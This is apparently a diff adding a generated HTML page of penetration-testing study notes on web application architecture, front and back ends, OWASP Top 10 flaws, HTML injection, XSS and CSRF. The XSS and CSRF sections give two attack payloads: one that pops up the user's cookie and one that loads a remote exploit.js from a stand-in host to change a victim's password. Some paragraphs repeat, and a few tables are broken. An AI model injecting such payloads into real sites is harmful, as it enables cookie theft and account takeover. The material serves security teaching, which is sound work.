+    REST
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#public-cve" class="md-nav__link">
+    Public CVE
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-vulnerability-scoring-system-cvss" class="md-nav__link">
+    Common Vulnerability Scoring System (CVSS)
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web_req/" class="md-nav__link">
+        Web Requests
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../proxies/" class="md-nav__link">
+        Web Proxies
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../http_code/" class="md-nav__link">
+        HTTP Status Codes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#web-applications-vs-websites" class="md-nav__link">
+    Web Applications vs. Websites
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-application-distribution" class="md-nav__link">
+    Web Application Distribution
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#security-risks-of-web-applications" class="md-nav__link">
+    Security Risks of Web Applications
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-application-layout" class="md-nav__link">
+    Web Application Layout
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-application-infrastructure" class="md-nav__link">
+    Web Application Infrastructure
+  </a>
+  
+    <nav class="md-nav" aria-label="Web Application Infrastructure">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#client-server" class="md-nav__link">
+    Client-Server
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#one-server" class="md-nav__link">
+    One Server
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#many-servers-one-database" class="md-nav__link">
+    Many Servers - One Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#many-servers-many-databases" class="md-nav__link">
+    Many Servers - Many Databases
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-application-component" class="md-nav__link">
+    Web Application Component
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-application-architecture" class="md-nav__link">
+    Web Application Architecture
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#microservices" class="md-nav__link">
+    Microservices
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#serverless" class="md-nav__link">
+    Serverless
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#front-end-vs-back-end" class="md-nav__link">
+    Front End vs. Back End
+  </a>
+  
+    <nav class="md-nav" aria-label="Front End vs. Back End">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#front-end" class="md-nav__link">
+    Front End
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#back-end" class="md-nav__link">
+    Back End
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#securing-frontback-end" class="md-nav__link">
+    Securing Front/Back End
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sensitive-data-exposure" class="md-nav__link">
+    Sensitive Data Exposure
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#html-injection" class="md-nav__link">
+    HTML Injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cross-site-scripting-xss" class="md-nav__link">
+    Cross-Site Scripting (XSS)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cross-site-request-forgery-csrf" class="md-nav__link">
+    Cross-Site Request Forgery (CSRF)
+  </a>
+  
+    <nav class="md-nav" aria-label="Cross-Site Request Forgery (CSRF)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#prevention" class="md-nav__link">
+    Prevention
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#back-end-servers" class="md-nav__link">
+    Back End Servers
+  </a>
+  
+    <nav class="md-nav" aria-label="Back End Servers">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#software" class="md-nav__link">
+    Software
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-servers" class="md-nav__link">
+    Web Servers
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#workflow" class="md-nav__link">
+    Workflow
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#databases" class="md-nav__link">
+    Databases
+  </a>
+  
+    <nav class="md-nav" aria-label="Databases">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#relational-sql" class="md-nav__link">
+    Relational (SQL)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#non-relational-nosql" class="md-nav__link">
+    Non-relational (NoSQL)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#development-frameworks-apis" class="md-nav__link">
+    Development Frameworks &amp; APIs
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-apis" class="md-nav__link">
+    Web APIs
+  </a>
+  
+    <nav class="md-nav" aria-label="Web APIs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#soap" class="md-nav__link">
+    SOAP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rest" class="md-nav__link">
+    REST
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#public-cve" class="md-nav__link">
+    Public CVE
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-vulnerability-scoring-system-cvss" class="md-nav__link">
+    Common Vulnerability Scoring System (CVSS)
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+
+  <h1>Web Applications</h1>
+
+<p><img alt="logo1" src="../img/logo1.png" /></p>
+<p>Web applications are interactive applications that run on web browsers. Web applications usually adopt a client-server architecture to run and handle interactions. They typically have front end components (i.e., the website interface, or &ldquo;what the user sees&rdquo;) that run on the client-side (browser) and other back end components (web application source code) that run on the server-side (back end server/databases).</p>
+<p>This allows organizations to host powerful applications with near-complete real-time control over their design and functionality while being accessible worldwide. Some examples of typical web applications include online email services like Gmail, online retailers Amazon, and online word processors like Google Docs.</p>
+<p>Web applications are not exclusive to giant providers like Google or Microsoft but can be developed by any web developer and hosted online in any of the common hosting services, to be used by anyone on the internet. This is why today we have millions of web applications all over the internet, with billions of users interacting with them every day</p>
+<h3 id="web-applications-vs-websites">Web Applications vs. Websites</h3>
+<p>In the past, we interacted with websites that are static and cannot be changed in real-time. This means that traditional websites were statically created to represent specific information, and this information would not change with our interaction. To change the website&rsquo;s content, the corresponding page has to be edited by the developers manually. These types of static pages do not contain functions and, therefore, do not produce real-time changes. That type of website is also known as Web 1.0.</p>
+<p><img alt="web" src="../img/website_vs_webapps.jpg" /></p>
+<p>In the past, we interacted with websites that are static and cannot be changed in real-time. This means that traditional websites were statically created to represent specific information, and this information would not change with our interaction. To change the website&rsquo;s content, the corresponding page has to be edited by the developers manually. These types of static pages do not contain functions and, therefore, do not produce real-time changes. That type of website is also known as Web 1.0.</p>
+<ul>
+<li>Being modular</li>
+<li>Running on any display size</li>
+<li>Running on any platform without being optimized</li>
+</ul>
+<h3 id="web-application-distribution">Web Application Distribution</h3>
+<p>There are many open-source web applications used by organizations worldwide that can be customized to meet each organization&rsquo;s needs. Some common open source web applications includ</p>
+<ul>
+<li>WordPress</li>
+<li>OpenCart</li>
+<li>Joomla</li>
+</ul>
+<p>There are also proprietary &lsquo;closed source&rsquo; web applications, which are usually developed by a certain organization and then sold to another organization or used by organizations through a subscription plan model. Some common closed source web applications include:</p>
+<ul>
+<li>Wix</li>
+<li>Shopify</li>
+<li>DotNetNuke</li>
+</ul>
+<h3 id="security-risks-of-web-applications">Security Risks of Web Applications</h3>
+<p>Web application attacks are prevalent and present a challenge for most organizations with a web presence, regardless of their size. After all, they are usually accessible from any country by everyone with an internet connection and a web browser and usually offer a vast attack surface.
+As web applications become more complicated and advanced, so does the possibility of critical vulnerabilities being incorporated into their design.</p>
+<p>Since web applications are run on servers that may host other sensitive information and are often also linked to databases containing sensitive user or corporate data, all of this data could be compromised if a web site is successfully attacked. This is why it is critical for any business that utilizes web applications to properly test these applications for vulnerabilities and patch them promptly while testing that the patch fixes the flaw and does not inadvertently introduce any new flaws.</p>
+<p>Web application penetration testing is an increasingly critical skill to learn. Any organization looking to secure their internet-facing (and internal) web applications should undergo frequent web application tests and implement secure coding practices at every development life cycle stage.</p>
+<p>To properly pentest web applications, we need to understand how they work, how they are developed, and what kind of risk lies at each layer and component of the application depending on the technologies in use.</p>
+<p>ne of the most current and widely used methods for testing web applications is the <a href="https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing">OWASP Web Security Testing Guide</a>.</p>
+<p>One of the most common procedures is to start by reviewing a web application&rsquo;s front end components, such as <code>HTML</code>, <code>CSS</code> and <code>JavaScript</code> (also known as the front end trinity), and attempt to find vulnerabilities such as <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Sensitive Data Exposure</a> and <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Cross-Site Scripting (XSS)</a>. Once all front end components are thoroughly tested, we would typically review the web application&rsquo;s core functionality and the interaction between the browser and the webserver to enumerate the technologies the webserver uses and look for exploitable flaws. We typically assess web applications from both an unauthenticated and authenticated perspective (if the application has login functionality) to maximize coverage and review every possible attack scenario.</p>
+<h3 id="web-application-layout">Web Application Layout</h3>
+<p>No two web applications are identical. Businesses create web applications for a multitude of uses and audiences. Web applications are designed and programmed differently, and back end infrastructure can be set up in many different ways. It is important to understand the various ways web applications can run behind the scenes, the structure of a web application, its components, and how they can be set up within a company&rsquo;s infrastructure.</p>
+<p>Web application layouts consist of many different layers that can be summarized with the following three main categories:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Category</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Web Application Infrastructure</td>
+<td>Describes the structure of required components, such as the database, needed for the web application to function as intended. Since the web application can be set up to run on a separate server, it is essential to know which database server it needs to access.</td>
+</tr>
+<tr>
+<td>Web Application Components</td>
+<td>The components that make up a web application represent all the components that the web application interacts with. These are divided into the following three areas: UI/UX, Client, and Server components.</td>
+</tr>
+<tr>
+<td>Web Application Architecture</td>
+<td>Architecture comprises all the relationships between the various web application component</td>
+</tr>
+</tbody>
+</table>
+<h3 id="web-application-infrastructure">Web Application Infrastructure</h3>
+<p>Web applications can use many different infrastructure setups. These are also called models. The most common ones can be grouped into the following four types:</p>
+<ul>
+<li>Client-Server</li>
+<li>One Server</li>
+<li>Many Servers - One Database</li>
+<li>Many Servers - Many Databases</li>
+</ul>
+<h4 id="client-server">Client-Server</h4>
+<p>Web applications often adopt the client-server model. A server hosts the web application in a client-server model and distributes it to any clients trying to access it.
+<img alt="client/server" src="../img/client-server-model.jpg" /></p>
+<p>In this model, web applications have two types of components, those in the front end, which are usually interpreted and executed on the client-side (browser), and components in the back end, usually compiled, interpreted, and executed by the hosting server.</p>
+<p>When a client visits the web application&rsquo;s URL (web address, i.e., https://www.acme.local), the server uses the main web application interface (UI). Once the user clicks on a button or requests a specific function, the browser sends an HTTP web request to the server, which interprets this request and performs the necessary task(s) to complete the request (i.e., logging the user in, adding an item to the shopping cart, browsing to another page, etc.). Once the server has the required data, it sends the result back to the client&rsquo;s browser, displaying the result in a human-readable way.</p>
+<p>However, even though most web applications utilize a client-server front-back end architecture, there are many design implementations.</p>
+<h4 id="one-server">One Server</h4>
+<p><img alt="oneser" src="../img/one-server-arch.jpg" /></p>
+<p>If any web application hosted on this server is compromised in this architecture, then all web applications&rsquo; data will be compromised. This design represents an &ldquo;all eggs in one basket&rdquo; approach since if any of the hosted web applications are vulnerable, the entire webserver becomes vulnerable.</p>
+<h4 id="many-servers-one-database">Many Servers - One Database</h4>
+<p>This model separates the database onto its own database server and allows the web applications&rsquo; hosting server to access the database server to store and retrieve data. It can be seen as many-servers to one-database and one-server to one-database, as long as the database is separated on its own database server.
+<img alt="many" src="../img/many-server-one-db-arch.jpg" />
+This model&rsquo;s main advantage (from a security point of view) is segmentation, where each of the main components of a web application is located and hosted separately. In case one webserver is compromised, other webservers are not directly affected. Similarly, if the database is compromised (i.e., through a SQL injection vulnerability), the web application itself is not directly affected. There are still access control measures that need to be implemented after asset segmentation, such as limiting web application access to only data needed to function as intendedThis model&rsquo;s main advantage (from a security point of view) is segmentation, where each of the main components of a web application is located and hosted separately. In case one webserver is compromised, other webservers are not directly affected. Similarly, if the database is compromised (i.e., through a SQL injection vulnerability), the web application itself is not directly affected. There are still access control measures that need to be implemented after asset segmentation, such as limiting web application access to only data needed to function as intended</p>
+<h4 id="many-servers-many-databases">Many Servers - Many Databases</h4>
+<p><img alt="many/many" src="../img/many-server-many-db-arch.jpg" /></p>
+<p>This design is also widely used for redundancy purposes, so if any web server or database goes offline, a backup will run in its place to reduce downtime as much as possible</p>
+<h4 id="web-application-component">Web Application Component</h4>
+<p>Each web application can have a different number of components. Nevertheless, all of the components of the models mentioned previously can be broken down to:</p>
+<ol>
+<li>Client</li>
+<li>Server<ul>
+<li>Webserver</li>
+<li>Web Application Logic</li>
+<li>Database</li>
+</ul>
+</li>
+<li>Services (Microservices)<ul>
+<li>3rd Party Integrations</li>
+<li>Web Application Integrations</li>
+</ul>
+</li>
+<li>Functions (Serverless)</li>
+</ol>
+<h4 id="web-application-architecture">Web Application Architecture</h4>
+<table>
+<thead>
+<tr>
+<th><strong>Layer</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Presentation Layer</td>
+<td>Consists of UI process components that enable communication with the application and the system. These can be accessed by the client via the web browser and are returned in the form of HTML, JavaScript, and CSS.</td>
+</tr>
+<tr>
+<td>Application Layer</td>
+<td>This layer ensures that all client requests (web requests) are correctly processed. Various criteria are checked, such as authorization, privileges, and data passed on to the client.</td>
+</tr>
+<tr>
+<td>Data Layer</td>
+<td>The data layer works closely with the application layer to determine exactly where the required data is stored and can be accessed</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="asp" src="../img/image5-12.png" /></p>
+<h4 id="microservices">Microservices</h4>
+<p>We can think of microservices as independent components of the web application, which in most cases are programmed for one task only. For example, for an online store, we can decompose core tasks into the following components:</p>
+<ul>
+<li>Registration</li>
+<li>Search</li>
+<li>Payments</li>
+<li>Ratings</li>
+<li>Reviews</li>
+</ul>
+<p>These components communicate with the client and with each other. The communication between these microservices is <code>stateless</code>, which means that the request and response are independent. This is because the stored data is <code>stored separately</code> from the respective microservices.</p>
+<p>This AWS <a href="https://d1.awsstatic.com/whitepapers/microservices-on-aws.pdf">whitepaper</a> provides an excellent overview of microservice implementation.</p>
+<h4 id="serverless">Serverless</h4>
+<p>Cloud providers such as AWS, GCP, Azure, among others, offer serverless architectures. These platforms provide application frameworks to build such web applications without having to worry about the servers themselves. These web applications then run in stateless computing containers (Docker, for example). This type of architecture gives a company the flexibility to build and deploy applications and services without having to manage infrastructure; all server management is done by the cloud provider, which gets rid of the need to provision, scale, and maintain servers needed to run applications and databases.</p>
+<p>You can read more about serverless computing and its various use cases <a href="https://aws.amazon.com/serverless/">here</a>.</p>
+<h3 id="front-end-vs-back-end">Front End vs. Back End</h3>
+<p>We may have heard the terms front end and back end web development, or the term Full Stack web development, which refers to both front and back end web development. These terms are becoming synonymous with web application development, as they comprise the majority of the web development cycle. However, these terms are very different from each other, as each refers to one side of the web application, and each function and communicate in different are</p>
+<h4 id="front-end">Front End</h4>
+<p>The front end of a web application contains the user&rsquo;s components directly through their web browser (client-side). These components make up the source code of the web page we view when visiting a web application and usually include <code>HTML</code>, <code>CSS</code>, and <code>JavaScript</code>, which is then interpreted in real-time by our browser
+<img alt="front" src="../img/frontend-components.jpg" /></p>
+<p>This includes everything that the user sees and interacts with, like the page&rsquo;s main elements such as the title and text <code>HTML</code>, the design and animation of all elements <code>CSS</code>, and what function each part of a page performs <code>JavaScript</code>.</p>
+<p>There are many sites available to us to practice front end coding. One example is <a href="https://html-css-js.com/">this one</a>. </p>
+<h4 id="back-end">Back End</h4>
+<p>The back end of a web application drives all of the core web application functionalities, all of which is executed at the back end server, which processes everything required for the web application to run correctly. It is the part we may never see or directly interact with, but a website is just a collection of static web pages without a back end.</p>
+<p>There are four main back end components for web applications:
+|<strong>Components</strong>|<strong>Description</strong>|
+|--------------|---------------|
+|Back end Servers   |The hardware and operating system that hosts all other components and are usually run on operating systems like Linux, Windows, or using Containers.
+|Web Servers    |Web servers handle HTTP requests and connections. Some examples are Apache, NGINX, and IIS.
+|Databases  |Databases (DBs) store and retrieve the web application data. Some examples of relational databases are MySQL, MSSQL, Oracle, PostgreSQL, while examples of non-relational databases include NoSQL and MongoDB.
+|Development Frameworks |   Development Frameworks are used to develop the core Web Application. Some well-known frameworks include PHP, C#, Java, Python, and NodeJS JavaScript.</p>
+<p><img alt="back" src="../img/backend-server.jpg" /></p>
+<h4 id="securing-frontback-end">Securing Front/Back End</h4>
+<p>Even though in most cases, we will not have access to the back end code to analyze the individual functions and the structure of the code, it does not make the application invulnerable. It could still be exploited by various injection attacks, for example.</p>
+<p>Suppose we have a search function in a web application that mistakenly does not process our search queries correctly. In that case, we could use specific techniques to manipulate the queries in such a way that we gain unauthorized access to specific database data SQL injections or even execute operating system commands via the web application, also known as Command Injections.</p>
+<p>The top 20 most common mistakes web developers make that are essential for us as penetration testers are:</p>
+<ol>
+<li>Permitting Invalid Data to Enter the Database</li>
+<li>Focusing on the System as a Whole</li>
+<li>Establishing Personally Developed Security Methods</li>
+<li>Treating Security to be Your Last Step</li>
+<li>Developing Plain Text Password Storage</li>
+<li>Creating Weak Passwords</li>
+<li>Storing Unencrypted Data in the Database</li>
+<li>Depending Excessively on the Client Side</li>
+<li>Being Too Optimistic</li>
+<li>Permitting Variables via the URL Path Name</li>
+<li>Trusting third-party code</li>
+<li>Hard-coding backdoor accounts</li>
+<li>Unverified SQL injections</li>
+<li>Remote file inclusions</li>
+<li>Insecure data handling</li>
+<li>Failing to encrypt data properly</li>
+<li>Not using a secure cryptographic system</li>
+<li>Ignoring layer 8</li>
+<li>Review user actions</li>
+<li>Web Application Firewall misconfigurations</li>
+</ol>
+<p>These mistakes lead to the <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10 vulnerabilities</a> for web applications, which we will discuss in other modules:</p>
+<ol>
+<li>Injection</li>
+<li>Broken Authentication</li>
+<li>Sensitive Data Exposure</li>
+<li>XML External Entities (XXE)</li>
+<li>Broken Access Control</li>
+<li>Security Misconfiguration</li>
+<li>Cross-Site Scripting (XSS)</li>
+<li>Insecure Deserialization</li>
+<li>Using Components with Known Vulnerabilities</li>
+<li>Insufficient Logging &amp; Monitorin</li>
+</ol>
+<h3 id="sensitive-data-exposure">Sensitive Data Exposure</h3>
+<p>All of the front end components we covered are interacted with on the client-side. Therefore, if they are attacked, they do not pose a direct threat to the core back end of the web application and usually will not lead to permanent damage. However, as these components are executed on the client-side, they put the end-user in danger of being attacked and exploited if they do have any vulnerabilities. If a front end vulnerability is leveraged to attack admin users, it could result in unauthorized access, access to sensitive data, service disruption, and more.</p>
+<p>Although the majority of web application penetration testing is focused on back end components and their functionality, it is important also to test front end components for potential vulnerabilities, as these types of vulnerabilities are can sometimes be utilized to gain access to sensitive functionality (i.e., an admin panel), which may lead to compromising the entire server.</p>
+<p><code>Sensitive Data Exposure</code> refers to the availability of sensitive data in clear-text to the end-user. This is usually found in the source code of the web page or page source on the front end of web applications. </p>
+<h3 id="html-injection">HTML Injection</h3>
+<p>Another major aspect of front end security is validating and sanitizing accepted user input. In many cases, user input validation and sanitization is carried out on the back end. However, some user input would never make it to the back end in some cases and is completely processed and rendered on the front end. Therefore, it is critical to validate and sanitize user input on both the front end and the back end.</p>
+<p>When a user has complete control of how their input will be displayed, they can submit HTML code, and the browser may display it as part of the page. This may include a malicious HTML code, like an external login form, which can be used to trick users into logging in while actually sending their login credentials to a malicious server to be collected for other attacks.</p>
+<p>Another example of <code>HTML Injection</code> is web page defacing. This consists of injecting new <code>HTML</code> code to change the web page&rsquo;s appearance, inserting malicious ads, or even completely changing the page. This type of attack can result in severe reputational damage to the company hosting the web application.</p>
+<h3 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h3>
+<p><code>HTML Injection</code> vulnerabilities can often be utilized to also perform <code>Cross-Site Scripting (XSS)</code> attacks by injecting <code>JavaScript</code> code to be executed on the client-side. Once we can execute code on the victim&rsquo;s machine, we can potentially gain access to the victim&rsquo;s account or even their machine. <code>XSS</code> is very similar to <code>HTML Injection</code> in practice. However, <code>XSS</code> involves the injection of <code>JavaScript</code> code to perform more advanced attacks on the client-side, instead of merely injecting <code>HTML</code> code. There are three main types of <code>XSS</code>:
+|<strong>Type</strong>|<strong>Description</strong>|
+|--------|---------------|
+|Reflected XSS  |Occurs when user input is displayed on the page after processing (e.g., search result or error message).
+|Stored XSS     |Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).
+|DOM XSS    |Occurs when user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title).</p>
+<p>In the example we saw for HTML Injection, there was no input sanitization whatsoever. Therefore, it may be possible for the same page to be vulnerable to XSS attacks. We can try to inject the following DOM XSS JavaScript code as a payload, which should show us the cookie value for the current user:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>#&quot;&gt;&lt;img src=/ onerror=alert(document.cookie)&gt;
+</code></pre></div>
+<p>This payload is accessing the HTML document tree and retrieving the cookie object&rsquo;s value. When the browser processes our input, it will be considered a new DOM, and our JavaScript will be executed, displaying the cookie value back to us in a pop</p>
+<h3 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h3>
+<p>The third type of front end vulnerability that is caused by unfiltered user input is Cross-Site Request Forgery (CSRF). CSRF attacks may utilize XSS vulnerabilities to perform certain queries, and API calls on a web application that the victim is currently authenticated to.</p>
+<p>A common CSRF attack to gain higher privileged access to a web application is to craft a JavaScript payload that automatically changes the victim&rsquo;s password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the JavaScript CSRF payload), the JavaScript code would execute automatically. It would use the victim&rsquo;s logged-in session to change their password. Once that is done, the attacker can log in to the victim&rsquo;s account and control it.</p>
+<p>CSRF can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using JavaScript code that would return the session cookie, we would load a remote .js (JavaScript) file, as follows:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>&quot;&gt;&lt;script src=//www.example.com/exploit.js&gt;&lt;/script&gt;
+</code></pre></div>
+<p>The <code>exploit.js</code> file would contain the malicious <code>JavaScript</code> code that changes the user&rsquo;s password. Developing the <code>exploit.js</code> in this case requires knowledge of this web application&rsquo;s password changing procedure and <code>APIs</code>. The attacker would need to create JavaScript code that would replicate the desired functionality and automatically carry it out (i.e., JavaScript code that changes our password for this specific web application).</p>
+<h4 id="prevention">Prevention</h4>
+<p>Though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end before it reaches the back end, and especially if this code may be displayed directly on the client-side without communicating with the back end. Two main controls must be applied when accepting user input:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Type</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Sanitization</td>
+<td>Removing special characters and non-standard characters from user input before displaying it or storing it.</td>
+</tr>
+<tr>
+<td>Validation</td>
+<td>Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)</td>
+</tr>
+</tbody>
+</table>
+<p>Furthermore, it is also important to sanitize displayed output and clear any special/non-standard characters. In case an attacker manages to bypass front end and back end sanitization and validation filters, it will still not cause any harm on the front end.</p>
+<p>Once we sanitize and/or validate user input and displayed output, we should be able to prevent attacks like <code>HTML Injection</code>, <code>XSS</code>, or <code>CSRF</code>. Another solution would be to implement a <code>web application firewall (WAF)</code>, which should help to prevent injection attempts automatically. However, it should be noted that WAF solutions can potentially be bypassed, so developers should follow coding best practices and not merely rely on an appliance to detect/block attacks.</p>
+<p>This <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">Cross-Site Request Forgery Prevention Cheat Sheet</a> from OWASP discusses the attack and prevention measures in greater detail.</p>
+<h3 id="back-end-servers">Back End Servers</h3>
+<p>A back end server is the hardware and operating system on the back end that hosts all of the applications necessary to run the web application. It is the real system running all of the processes and carrying all of the tasks that make up the entire web application. The back end server would fit in the Data access layer.</p>
+<h4 id="software">Software</h4>
+<p>The back end server contains the other 3 back end components:</p>
+<ul>
+<li>Web Server</li>
+<li>Database</li>
+<li>Development Framework</li>
+</ul>
+<p>There are many popular combinations of &ldquo;stacks&rdquo; for back-end servers, which contain a specific set of back end components. Some common examples include:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Combinations</strong></th>
+<th><strong>Components</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>LAMP</td>
+<td>Linux, Apache, MySQL, and PHP.</td>
+</tr>
+<tr>
+<td>WAMP</td>
+<td>Windows, Apache, MySQL, and PHP.</td>
+</tr>
+<tr>
+<td>WINS</td>
+<td>Windows, IIS, .NET, and SQL Server</td>
+</tr>
+<tr>
+<td>MAMP</td>
+<td>macOS, Apache, MySQL, and PHP.</td>
+</tr>
+<tr>
+<td>XAMPP</td>
+<td>Cross-Platform, Apache, MySQL, and PHP/PERL.</td>
+</tr>
+</tbody>
+</table>
+<h4 id="web-servers">Web Servers</h4>
+<p>A web server is an application that runs on the back end server, which handles all of the HTTP traffic from the client-side browser, routes it to the requested pages, and finally responds to the client-side browser. Web servers usually run on TCP ports <code>80</code> or <code>443</code>, and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses.</p>
+<h4 id="workflow">Workflow</h4>
+<p>A typical web server accepts HTTP requests from the client-side, and responds with different HTTP responses and codes, like a code 200 OK response for a successful request, a code 404 NOT FOUND when requesting pages that do not exist, code 403 FORBIDDEN for requesting access to restricted pages, and so on.</p>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status">HTTP response code&rsquo;s</a></p>
+<h3 id="databases">Databases</h3>
+<p>Web applications utilize back end databases to store various content and information related to the web application. This can be core web application assets like images and files, web application content like posts and updates, or user data like usernames and passwords. This allows web applications to easily and quickly store and retrieve data and enable dynamic content that is different for each user.</p>
+<p>There are many different types of databases, each of which fits a certain type of use. Most developers look for certain characteristics in a database, such as speed in storing and retrieving data, size when storing large amounts of data, scalability as the web application grows, and cost.</p>
+<h4 id="relational-sql">Relational (SQL)</h4>
+<p>Relational (SQL) databases store their data in tables, rows, and columns. Each table can have unique keys, which can link tables together and create relationships between tables.</p>
+<p>For example, we can have a users table in a relational database containing columns like id, username, first_name, last_name, and so on. The id can be used as the table key. Another table, posts, may contain posts made by all users, with columns like id, user_id, date, content, and so on.</p>
+<p><img alt="web-app" src="../img/web_apps_relational_db.jpg" /></p>
+<p>We can link the id from the users table to the user_id in the posts table to easily retrieve the user details for each post, without having to store all user details with each post.</p>
+<p>The relationship between tables within a database is called a Schema.</p>
+<p>This way, by using relational databases, it becomes very quick and easy to retrieve all data about a certain element from all databases. For example, we can retrieve all details linked to a certain user from all tables with a single query.</p>
+<p>This makes relational databases very fast and reliable for big datasets that have a clear structure and design. Databases also make data management very efficient.</p>
+<p>Some of the most common relational databases include:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Type</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td>The most commonly used database around the internet. It is an open-source database and can be used completely free of charge</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>Microsoft&rsquo;s implementation of a relational database. Widely used with Windows Servers and IIS web servers</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>A very reliable database for big businesses, and is frequently updated with innovative database solutions to make it faster and more reliable. It can be costly, even for big businesses</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
